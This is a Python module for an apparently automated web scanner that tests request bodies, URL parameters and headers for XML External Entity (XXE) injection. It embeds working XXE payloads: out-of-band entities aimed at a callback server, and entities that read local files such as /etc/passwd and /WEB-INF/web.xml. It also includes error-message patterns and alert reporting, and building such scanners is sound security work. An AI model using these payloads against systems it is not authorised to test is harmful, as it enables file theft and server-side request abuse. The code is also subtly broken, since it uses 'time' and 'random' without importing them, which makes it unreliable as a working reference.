# Filename: VulnerabilityChecks/XXEScanRule.py

import asyncio
import logging
import uuid
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Pattern, Set # Added Set
import xml.etree.ElementTree as ET # For basic XML validation of payloads if needed
import re

import aiohttp

# --- Alert Definition ---
@dataclass
class XXEAlert:
    # Non-default fields first
    cwe_id: int
    name: str
    description: str
    uri: str
    param: str 
    attack: str 
    evidence: str
    
    # Default fields
    wasc_id: int = 0 
    other_info: str = ""
    solution: str = (
        "Disable external entity processing in XML parsers. "
        "Use a less complex data format if possible (e.g., JSON). "
        "Validate and sanitize any user-supplied data used within XML structures. "
        "Keep XML parsers and libraries updated."
    )
    reference: str = (
        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\n"
        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
    )
    risk: int = 4
    confidence: int = 2
    oast_payload_sent: Optional[str] = None
    error_pattern_matched: Optional[str] = None
    is_blind_oast: bool = True
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "OWASP_2021_A03": "Injection",
        "WSTG_V42_INPV_07": "XML_External_Entity"
    })
    attack_details: Dict[str, Any] = field(default_factory=dict) # Added for consistency

    def as_dict(self) -> Dict[str, Any]:
        tags = self.alert_tags.copy()
        if self.oast_payload_sent: tags["OAST"] = "Required" if self.is_blind_oast else "Attempted"
        if self.error_pattern_matched: tags["ErrorBased"] = "True"

        return {
            "vulnerability_type": "XXE Injection", "type": self.name,
            "detail": self.description, "payload_used": self.attack,
            "injection_point_info": f"Location: {self.attack_details.get('location', 'N/A')}, Parameter: {self.param}",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence, "solution": self.solution,
            "reference": self.reference, "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id, "alert_tags": tags,
            "other_info": self.other_info,
            "attack_details_dict": self.attack_details
        }

# --- XXE Payloads and Constants ---
XXE_OOB_GENERAL_PAYLOADS = [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{0}"> ]><data>&xxe;</data>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % pe SYSTEM "{0}"> %pe; ]><data/>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % wrapper "<!ENTITY % xxe_direct SYSTEM \'{0}\'>" > %wrapper; %xxe_direct; ]><data/>',
]
XXE_FILE_READ_ERROR_PAYLOADS = [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{file_path}"> ]><data>&xxe;</data>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file://{file_path}"> %xxe; ]><data/>',
]
COMMON_FILE_PATHS_FOR_XXE_ERROR = ["/etc/passwd", "/etc/hostname", "C:/boot.ini", "/WEB-INF/web.xml", "file:///d:/"]
XXE_ERROR_PATTERNS_REGEX = [
    re.compile(r"java\.io\.FileNotFoundException", re.IGNORECASE), re.compile(r"ENTITY.*not found", re.IGNORECASE),
    re.compile(r"Failed to read external DTD", re.IGNORECASE), re.compile(r"XML parser error.*entity", re.IGNORECASE),
    re.compile(r"Could not resolve entity", re.IGNORECASE), re.compile(r"External Entity Not Allowed", re.IGNORECASE),
]

class XXEScanRule:
    tech_required: Set[str] = {"xml", "soap", "webdav", "rest-xml", "java", "dotnet"} # Technologies often using XML

    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 active_scan_async_q: Optional[asyncio.Queue] = None, # Added
                 oast_base_url: Optional[str] = None,
                 http_timeout: float = 15.0,
                 max_oob_payloads_to_try: int = 2, # Reduced default
                 max_error_payloads_to_try: int = 1  # Reduced default
                ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.active_scan_async_q = active_scan_async_q # Store it
        self.oast_base_url = oast_base_url
        self.http_timeout = http_timeout
        self.max_oob_payloads_to_try = max_oob_payloads_to_try
        self.max_error_payloads_to_try = max_error_payloads_to_try

        if not self.oast_base_url and self.max_oob_payloads_to_try > 0:
            self.logger.warning("XXEScanRule: OAST base URL not configured, OOB XXE checks will be limited.")
            # self.max_oob_payloads_to_try = 0 # Keep trying, but evidence will be "payload sent"
        self.logger.debug(f"XXEScanRule initialized. OAST: {self.oast_base_url}, Timeout: {self.http_timeout}s")

    async def _emit_alert(self, alert_obj: XXEAlert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({"type": "active_scan_alert", "alert": alert_obj.as_dict()})
                self.logger.info(f"XXEScan: Emitted alert - {alert_obj.name} for {alert_obj.uri}")
            except Exception as e:
                self.logger.error(f"XXEScan: Failed to emit alert to queue: {e}")
        else:
            self.logger.warning(f"XXEScan: Async queue not available. Alert not emitted: {alert_obj.name}")

    def _generate_oast_target_urls(self) -> Tuple[str, Optional[str], Optional[str]]: # unique_id, http_url, dns_host
        unique_id = str(uuid.uuid4())
        if not self.oast_base_url:
            return unique_id, None, None
        
        oast_domain_part = self.oast_base_url.replace("http://", "").replace("https://", "").split('/')[0]
        http_oast_url_base = self.oast_base_url
        if not http_oast_url_base.startswith(("http://", "https://")):
            http_oast_url_base = f"http://{http_oast_url_base}"
        http_oast_target = f"{http_oast_url_base.rstrip('/')}/{unique_id}"
        dns_oast_target_host = f"{unique_id}.{oast_domain_part}"
        return unique_id, http_oast_target, dns_oast_target_host

    async def _send_xml_request(
        self, session: aiohttp.ClientSession, method: str, url: str,
        headers: Dict[str, str], cookies: Dict[str, str],
        xml_data_payload: Optional[str] = None, # Full XML string for body
        query_params_with_xml: Optional[Dict[str,str]] = None, # For XML in URL param
        param_name_attacked: Optional[str] = None
    ) -> Tuple[Optional[Any], Optional[str], float]: # DetachedResponse, text, duration_ms
        start_time = time.monotonic()
        current_headers = headers.copy()
        if "User-Agent" not in current_headers:
             current_headers["User-Agent"] = "XXEScanner/1.0"

        log_payload_snippet = ""
        if xml_data_payload:
            log_payload_snippet = xml_data_payload[:100].replace('\n', ' ') + "..." if len(xml_data_payload) > 100 else xml_data_payload.replace('\n', ' ')
        elif query_params_with_xml:
            log_payload_snippet = str(query_params_with_xml)[:100] + "..."
        
        self.logger.debug(f"XXE Scan: Sending {method} XML to {url} (Param: {param_name_attacked}, Payload Hint: {log_payload_snippet})")
        
        response_text: Optional[str] = None; resp_status: Optional[int] = None; resp_headers: Dict[str,str] = {}
        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            request_kwargs: Dict[str, Any] = {"headers": current_headers, "cookies": cookies, "timeout": timeout}
            if query_params_with_xml: request_kwargs["params"] = query_params_with_xml
            if xml_data_payload: # For POST/PUT body
                request_kwargs["data"] = xml_data_payload.encode('utf-8')
                current_headers['Content-Type'] = 'application/xml' # Ensure correct CType for body
            
            async with session.request(method.upper(), url, **request_kwargs) as resp:
                response_text = await resp.text(errors='replace')
                resp_status = resp.status; resp_headers = dict(resp.headers)
            duration_ms = (time.monotonic() - start_time) * 1000
            self.logger.debug(f"XXE Scan: Response from {url}: Status {resp_status}, Duration: {duration_ms:.0f}ms")
            @dataclass
            class DetachedResponse: status: int; headers: Dict[str, str]; text_content: Optional[str]
            return DetachedResponse(status=resp_status or 0, headers=resp_headers, text_content=response_text), response_text, duration_ms
        except Exception as e:
            self.logger.warning(f"XXE Scan: Request for {method} {url} failed: {type(e).__name__} - {e}")
            return None, None, (time.monotonic() - start_time) * 1000

    async def scan(
        self,
        original_url: str,
        aiohttp_session: aiohttp.ClientSession,
        injection_details: Dict[str, Any],
        original_headers: Dict[str, str],
        original_cookies: Dict[str, str],
        original_page_content_for_baseline_errors: Optional[str] = None,
        # Other common args
        base_app_url: Optional[str] = None,
        html_content: Optional[str] = None,
        worker_ident: Optional[str] = "XXEScan",
        page_specific_technologies: Optional[List[str]] = None,
        service_type_hint: Optional[str] = None,
    ) -> None: # Changed return type
        param_name = injection_details["param_name"]
        original_value = injection_details["original_value"] # This might be the original XML body or param value
        location = injection_details["location"]
        method = injection_details.get("method", "POST" if location == "request_body_xml_raw" else "GET").upper()
        target_url_for_tests = injection_details.get("action_url", original_url)

        self.logger.info(f"[{worker_ident}] Starting XXE scan for target: '{param_name}' ({location}) on URL: {target_url_for_tests}")
        alert_emitted_for_point = False

        # --- 1. OOB XXE Attempts ---
        if self.max_oob_payloads_to_try > 0: # OAST URL presence checked in __init__
            oob_payload_templates = random.sample(XXE_OOB_GENERAL_PAYLOADS, min(len(XXE_OOB_GENERAL_PAYLOADS), self.max_oob_payloads_to_try))
            for oob_template in oob_payload_templates:
                if alert_emitted_for_point: break
                unique_oast_id, http_oast_target, dns_oast_host = self._generate_oast_target_urls()
                if not http_oast_target: continue # Skip if OAST not configured properly

                attack_xml_payload = oob_template.replace("{0}", http_oast_target).replace("{1}", dns_oast_host or "")
                
                query_params_with_xml = None; xml_body_to_send = None
                current_headers = original_headers.copy()

                if location == "request_body_xml_raw": # Assumes param_name is placeholder like "REQUEST_BODY"
                    xml_body_to_send = attack_xml_payload
                elif location == "url_params" or (location == "form_data_get" and method == "GET"):
                    parsed_target = urllib.parse.urlparse(target_url_for_tests)
                    query_params = urllib.parse.parse_qs(parsed_target.query, keep_blank_values=True)
                    query_params[param_name] = [attack_xml_payload]
                    target_url_for_tests = parsed_target._replace(query=urllib.parse.urlencode(query_params, doseq=True)).geturl()
                elif location == "form_data_post" and method == "POST":
                    # If original content type was XML, send raw XML. Otherwise, inject into form field.
                    if "xml" in original_headers.get("Content-Type", "").lower():
                        xml_body_to_send = attack_xml_payload
                    else: # Inject as form field value (less likely to be parsed as XML by server)
                        self.logger.debug(f"[{worker_ident}] XXE: Skipping OOB for form param '{param_name}' unless original Content-Type was XML.")
                        continue # Or try to send as raw XML anyway? For now, skip.
                elif location == "header": # XXE in header value is rare but possible if server parses it as XML
                    current_headers[param_name] = attack_xml_payload
                else: continue

                await self._send_xml_request(aiohttp_session, method, target_url_for_tests, current_headers, original_cookies, xml_body_to_send, query_params_with_xml, param_name)
                alert = XXEAlert(cwe_id=611, name="XXE Injection (OAST Attempt)",
                                 description=f"An OOB XXE payload was injected into '{param_name}' ({location}). Manual verification of OAST interaction is required.",
                                 uri=target_url_for_tests, param=param_name, attack=attack_xml_payload,
                                 evidence=f"OAST Payload Sent. Check OAST server for interaction with ID: {unique_oast_id} (HTTP: {http_oast_target}, DNS Host: {dns_oast_host})",
                                 oast_payload_sent=http_oast_target, is_blind_oast=True, confidence=2)
                alert.attack_details = {"location": location, "param": param_name, "method": method, "oast_id": unique_oast_id}
                await self._emit_alert(alert)
                # For OOB, we usually send all attempts and let OAST server collect. Don't set alert_emitted_for_point = True here.

        # --- 2. Error-Based XXE Attempts (In-Band) ---
        if self.max_error_payloads_to_try > 0 and not alert_emitted_for_point: # Only if no OOB confirmed yet
            file_paths_to_try = random.sample(COMMON_FILE_PATHS_FOR_XXE_ERROR, min(len(COMMON_FILE_PATHS_FOR_XXE_ERROR), 2))
            error_payload_templates = random.sample(XXE_FILE_READ_ERROR_PAYLOADS, min(len(XXE_FILE_READ_ERROR_PAYLOADS), self.max_error_payloads_to_try))
            for file_path in file_paths_to_try:
                if alert_emitted_for_point: break
                for error_template in error_payload_templates:
                    if alert_emitted_for_point: break
                    attack_xml_payload = error_template.replace("{file_path}", file_path)
                    query_params_with_xml = None; xml_body_to_send = None
                    current_headers = original_headers.copy()

                    if location == "request_body_xml_raw": xml_body_to_send = attack_xml_payload
                    elif location == "url_params" or (location == "form_data_get" and method == "GET"):
                        parsed_target = urllib.parse.urlparse(target_url_for_tests); query_params = urllib.parse.parse_qs(parsed_target.query, keep_blank_values=True)
                        query_params[param_name] = [attack_xml_payload]; target_url_for_tests = parsed_target._replace(query=urllib.parse.urlencode(query_params, doseq=True)).geturl()
                    elif location == "form_data_post" and method == "POST":
                        if "xml" in original_headers.get("Content-Type", "").lower(): xml_body_to_send = attack_xml_payload
                        else: continue
                    elif location == "header": current_headers[param_name] = attack_xml_payload
                    else: continue
                    
                    _, resp_text, _ = await self._send_xml_request(aiohttp_session, method, target_url_for_tests, current_headers, original_cookies, xml_body_to_send, query_params_with_xml, param_name)
                    if resp_text:
                        for err_pattern_re in XXE_ERROR_PATTERNS_REGEX:
                            match = err_pattern_re.search(resp_text)
                            base_match = None
                            if original_page_content_for_baseline_errors: base_match = err_pattern_re.search(original_page_content_for_baseline_errors)
                            if match and not base_match:
                                self.logger.info(f"[{worker_ident}] XXE Error-based: Pattern '{err_pattern_re.pattern}' matched for '{param_name}' trying file '{file_path}'")
                                alert = XXEAlert(cwe_id=611, name="XXE Injection (Error Based)",
                                                 description=f"An error message consistent with XXE processing was observed when trying to access '{file_path}' via parameter '{param_name}' ({location}).",
                                                 uri=target_url_for_tests, param=param_name, attack=attack_xml_payload,
                                                 evidence=match.group(0)[:250], error_pattern_matched=err_pattern_re.pattern,
                                                 is_blind_oast=False, confidence=3)
                                alert.attack_details = {"location": location, "param": param_name, "method": method, "file_path": file_path}
                                await self._emit_alert(alert)
                                alert_emitted_for_point = True; break 
        
        self.logger.info(f"[{worker_ident}] XXE scan for '{param_name}' completed.")